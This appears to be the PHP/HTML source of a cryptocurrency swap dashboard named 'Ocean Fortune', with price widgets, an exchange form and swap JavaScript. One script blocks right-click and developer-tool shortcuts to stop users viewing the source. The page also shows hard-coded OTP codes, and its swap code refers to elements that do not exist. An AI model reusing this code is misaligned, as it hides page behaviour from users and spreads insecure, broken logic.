<?php

ini_set('session.cookie_lifetime', 0);
ini_set('session.gc_maxlifetime', 0);
session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$user_lname = $_SESSION['user_lastname'] ;
$email = $_SESSION['user_email'] ;


if (!isset($_SESSION['notifications'])) {
  $_SESSION['notifications'] = [];
}

function addLoginNotification($userName) {
  $message = "Login successful for user: " . htmlspecialchars($userName);
  $_SESSION['notifications'][] = $message;
}

addLoginNotification($user_lname);

// Display notifications
?>


<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
        <!-- ============TITLE============= -->
        <title>Ocean Fortune</title>
    
        <!-- ============HEAD-ICON-LOGO============= -->
        <link rel="icon" type="image/png" href="assets/images/logo.png">
    
        <!-- ============CSS-LINKS============= -->
        <!-- <link rel="stylesheet" href="assets/css/main.css"> -->
        <link rel="stylesheet" href="assets/css/style.css">
        <link rel="stylesheet" href="assets/css/swap.css">
        <link rel="stylesheet" href="assets/css/table-wallet.css">
        <link rel="stylesheet" href="assets/css/mediaquery.css">
        <link rel="stylesheet" href="assets/css/main-mediaquery.css">
        <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.2.0/remixicon.min.css">
        <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    
    
    
        <!-- ============FONT-AWESOME-LINKS============= -->
        <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


        <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
    </head>


    <style>
        html{
          animation: none;
        }
        .tradingview-widget-container{
            width: auto;
            height: auto;
            position: relative;
            bottom: auto;
            z-index: auto;
        }
  
    </style>
<body>
    
      <header class="dashboard_header">
          <div class="wrapper">
            <div class="logo">
              <div class="image_wrapper">
                  <img src="assets/images/logo.png" width="42" height="42" alt="">
              </div>
              <!-- <div class="logo_name">Ocean </div> -->
            </div>

            <div class="icons">
              <ul>
                  <li class=""><a href="#"><i class="material-icons notification-icon">notifications_none</i></a>
                      <div class="notification_box">
                        <div class="wrapper">
                          <header>
                              <span>Notifications</span>
                              <a href="#">Clear All</a>
                          </header>
                          <ul>
                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>487887</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>
                          </ul>
                          <div class="view_all"><a href="#">View All</a></div>
                        </div>
                      </div>
                  </li>

                  <li><a href="#"><i class="material-icons account-icon">account_circle</i></a>
                      <div class="profile_box">
                          <ul>
                              <li>
                                  <a href="admin_profile.php">
                                      <i class="material-icons">person_outline</i>
                                      <span>Profile</span>
                                  </a>
                              </li>
                              <li>
                                  <a href="wallet_page.php">
                                      <i class="material-icons">account_balance_wallet</i>
                                      <span>Wallet</span>
                                  </a>
                              </li>
                              <li>
                                  <a href="logout.php">
                                      <i class="material-icons">logout</i>
                                      <span>Logout</span>
                                  </a>
                              </li>
                          </ul>
                      </div>

                      
                  </li>

                
              </ul>
            </div>
          </div>


        <!-- ============ CRYPTO STICKER ============= //--AT THE TOP, BELOW THE NAV BAR--//-->
        <div class="crypto-ticker">
          <div style="height:62px; background-color: #1e293b; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;">
              <div style="height:40px; padding:0px; margin:0px; width: 100%;">
                  <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
                  <script>
                      document.addEventListener('contextmenu', (event) => event.preventDefault());
                          document.onkeydown = function(e) {
                              // Disable F12, Ctrl+Shift+I (Inspector), Ctrl+Shift+J (Console), Ctrl+U (View Source)
                              if (e.keyCode == 123 || // F12
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) || // Ctrl+Shift+J
                                  (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
                                  return false; // Prevent the event
                              }
                          };
                  </script>
              </div>
              <div style="color: #1e293b; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;">
                  <a href="https://coinlib.io" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px"></a>
              </div>
          </div>
        </div>

      </header>
    <?php
    
        include 'swap_logic.php'
    
    ?>



    
        
            
      <aside class="sidebar">
          <div class="wrapper">


              <div class="sidebar_menu">
                  <ul>
                      <li>
                          <a href="dashboard.php">
                              <i class="material-icons">dashboard</i>
                              <span>Home</span>
                          </a>
                      </li>
                      <li>
                          <a href="swap.php">
                              <i class="material-icons">swap_calls</i>
                              <span>Swap</span>
                          </a>
                      </li>
                      <li>
                          <a href="history.php">
                              <i class="material-icons">history</i>
                              <span>History</span>
                          </a>
                      </li>
                      <li>
                          <a href="features.php">
                              <i class="material-icons">widgets</i>
                              <span>Features</span>
                          </a>
                      </li>
                      <li>
                          <a href="market.php">
                              <i class="material-icons">store</i>
                              <span>Market</span>
                          </a>
                      </li>
                  </ul>
              </div>

              <div class="sidebar_widgets">
                <div class="wrapper">
                  <div class="image">
                    <img src="assets/images/crypto-join.png" alt="">
                  </div>
                  <div class="text">
                    <h3>Invest Now!</h3>
                    <a href="">
                      Buy and Sell Coins
                    </a>
                    <br><br>
                  </div>
                </div>
              </div>
          </div>
      </aside>

      <main class="main_content">
        <div class="location_badge">
            <div class="wrapper"></div>
        </div>
        <section class="content">
            <div class="exchange-container">
                <form class="exchange-calculator">
                    <div id="error" class="error_message"> error!</div>
                    <div class="input-group">
                        <label class="input-label">You Pay</label>
                        <input type="text" class="form-control" placeholder="0.00"  id="input-amount">
                        <div class="crypto-select">
                            <button type="button" class="select-btn select-btn1" data-dropdown="from">
                                <span>Select Crypto</span>
                            </button>
                        </div>
                    </div>
    
                    <div class="equals-sign">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M7 13L17 13M7 17L17 17" stroke="white" stroke-linecap="round"/>
                        </svg>
                    </div>
    
                    <div class="input-group">
                        <label class="input-label">You Receive</label>
                        <input type="text" class="form-control" placeholder="0.00" disabled id="recieve-amount">
                        <div class="crypto-select">
                            <button type="button" class="select-btn select-btn2" data-dropdown="to">
                                <span>Select Crypto</span>
                            </button>
                        </div>
                    </div>
    
                    <div  class="exchange-btn" id="exchange-btn">Exchange Now</div>
                </form>
            </div>

            <style>
                .widget_wrapper {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 20px;
                    padding: 20px;
                    background-color: var( --surface);
                    border-radius: var(--border-radius);
                }
                .widget-card {
                    border-radius: 8px;
                    overflow: hidden;
                    background: rgba(255, 255, 255, 0.05);

                }
                .tradingview-widget-copyright {
                    font-size: 13px !important;
                    line-height: 32px !important;
                    text-align: center !important;
                    vertical-align: middle !important;
                    font-family: -apple-system, BlinkMacSystemFont, 'Trebuchet MS', Roboto, Ubuntu, sans-serif !important;
                    color: #B2B5BE !important;
                }
                .tradingview-widget-copyright .blue-text {
                    color: #2962FF !important;
                }
                .tradingview-widget-copyright a {
                    text-decoration: none !important;
                    color: #B2B5BE !important;
                }
                .tradingview-widget-copyright a:visited {
                    color: #B2B5BE !important;
                }
                .tradingview-widget-copyright a:hover .blue-text {
                    color: #1E53E5 !important;
                }
                .tradingview-widget-copyright a:active .blue-text {
                    color: #1848CC !important;
                }
                .tradingview-widget-copyright a:visited .blue-text {
                    color: #2962FF !important;
                }
                @media (max-width: 1200px) {
                    .widget_wrapper {
                        grid-template-columns: repeat(3, 1fr);
                    }
                }
                @media (max-width: 900px) {
                    .widget_wrapper {
                        grid-template-columns: repeat(2, 1fr);
                    }
                }
                @media (max-width: 600px) {
                    .widget_wrapper {
                        grid-template-columns: 1fr;
                    }
                }
            </style>
            </style>
            <div id="widgetWrapper" class="widget_wrapper"></div>

            <script>
                // List of widgets (TradingView)
                const widgets = [
                    { symbol: "BITSTAMP:BTCUSD", name: "BTC/USD" },
                    { symbol: "BITSTAMP:ETHUSD", name: "ETH/USD" },
                    { symbol: "BINANCE:LTCUSDT", name: "LTC/USDT" },
                    { symbol: "BINANCE:XRPUSDT", name: "XRP/USDT" },
                    { symbol: "BITMEX:XBTUSD", name: "XBT/USD" },
                    { symbol: "KRAKEN:DOTUSD", name: "DOT/USD" },
                    { symbol: "BITTREX:DOGEUSD", name: "DOGE/USD" },
                    { symbol: "BITFINEX:XRPUSD", name: "XRP/USD" }
                ];

                const widgetWrapper = document.getElementById('widgetWrapper');

                widgets.forEach(widget => {
                    const widgetCard = document.createElement('div');
                    widgetCard.className = 'widget-card';
                    widgetCard.innerHTML = `
                        <div class="tradingview-widget-container" style="width: 100%; height: 126px;">
                            <iframe scrolling="no" allowtransparency="true" frameborder="0" 
                                src="https://www.tradingview-widget.com/embed-widget/single-quote/?locale=in#%7B%22symbol%22%3A%22${widget.symbol}%22%2C%22width%22%3A%22100%25%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Atrue%2C%22height%22%3A126%2C%22utm_source%22%3A%22example.com%22%2C%22utm_medium%22%3A%22widget_new%22%2C%22utm_campaign%22%3A%22single-quote%22%2C%22page-uri%22%3A%22example.com%2Fpage%22%7D" 
                                style="box-sizing: border-box; height: calc(126px - 32px); width: 100%;">
                            </iframe>
                            <div class="tradingview-widget-copyright">
                                <a href="https://www.tradingview.com/symbols/${widget.symbol}/" rel="noopener" target="_blank">
                                    <span class="blue-text">${widget.name} Rates</span>
                                </a> by TradingView
                            </div>
                        </div>
                    `;
                    widgetWrapper.appendChild(widgetCard);
                });

                // Example data for cryptocurrencies, replace with actual data from your server
                const staticCryptoData = [
                    { symbol: 'BTC', amount: 1.5, name: 'Bitcoin' },
                    { symbol: 'ETH', amount: 3.0, name: 'Ethereum' },
                    { symbol: 'LTC', amount: 10.0, name: 'Litecoin' },
                    { symbol: 'XRP', amount: 1000, name: 'Ripple' },
                    { symbol: 'DOGE', amount: 5000, name: 'Dogecoin' }
                ];

                const fromSelect = document.getElementById('crypto-from');
                const toSelect = document.getElementById('crypto-to');

                // Populate "From" and "To" dropdowns
                staticCryptoData.forEach(crypto => {
                    const fromOption = document.createElement('option');
                    fromOption.value = crypto.symbol;
                    fromOption.textContent = `${crypto.name} (${crypto.amount} available)`;
                    fromSelect.appendChild(fromOption);

                    const toOption = document.createElement('option');
                    toOption.value = crypto.symbol;
                    toOption.textContent = crypto.name;
                    toSelect.appendChild(toOption);
                });

                // Calculate how much the user will receive
                document.getElementById('amount-from').addEventListener('input', function() {
                    const fromSymbol = fromSelect.value;
                    const toSymbol = toSelect.value;
                    const amountFrom = parseFloat(this.value);

                    if (isNaN(amountFrom) || amountFrom <= 0) return;

                    // Here, you should replace these prices with live prices from your server or an API
                    const fromPrice = staticCryptoData.find(crypto => crypto.symbol === fromSymbol).amount;
                    const toPrice = staticCryptoData.find(crypto => crypto.symbol === toSymbol).amount;

                    // Calculate the amount to receive
                    const amountTo = (amountFrom * toPrice / fromPrice).toFixed(4);
                    document.getElementById('amount-to').value = amountTo;
                });

                document.getElementById('swap-btn').addEventListener('click', async function () {
                    const fromSymbol = fromSelect.value;
                    const toSymbol = toSelect.value;
                    const amountFrom = parseFloat(document.getElementById('amount-from').value);
                    const amountTo = parseFloat(document.getElementById('amount-to').value);

                    if (isNaN(amountFrom) || isNaN(amountTo) || amountFrom <= 0 || amountTo <= 0) {
                        alert("Please enter a valid amount to swap.");
                        return;
                    }

                    try {
                        const response = await fetch('swap-api.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                fromSymbol,
                                toSymbol,
                                amountFrom,
                                amountTo,
                            }),
                        });

                        const data = await response.json();
                        if (data.status === 'success') {
                            alert('Swap completed successfully!');
                        } else {
                            alert(data.message || 'Swap failed.');
                        }
                    } catch (error) {
                        console.error(error);
                        alert('Error processing the swap. Please try again.');
                    }
                });

            </script>

        </section>
    
        <div class="overlay"></div>
        <div class="dropdown-menu">
            <div class="dropdown-header">Select Currency</div>
            <!-- Dropdown items will be dynamically inserted here -->
        </div>
        
        
      </main>

      
      <footer class="dashboard_footer">
        <div class="wrapper">
          <span>© 2024 <a href="index.php">Creative Fortune</a>All Right Reserved</span>
          <span><a href="#">Purchase Now</a></span>
        </div>
      </footer>

      <section class="bottom_nav">
        <div class="wrapper">
            <ul>
                <li>
                    <a href="dashboard.php">
                        <i class="material-icons">dashboard</i>
                        <span>Home</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="swap.php">
                        <i class="material-icons">swap_calls</i>
                        <span>Swap</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="history.php">
                        <i class="material-icons">history</i>
                        <span>History</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="features.php">
                        <i class="material-icons">widgets</i>
                        <span>Features</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="market.php">
                        <i class="material-icons">store</i>
                        <span>Market</span>
                    </a>
                </li>
            </ul>
        </div>
      </section>


 
    <!-- ============JAVASCRIPT-LINKS============= -->
    <script src="assets/user/javascript/popup.js"></script>
    <script src="assets/user/javascript/swap.js"></script>
    <script src="assets/javascript/active-tab.js"></script>
</body>
</html>

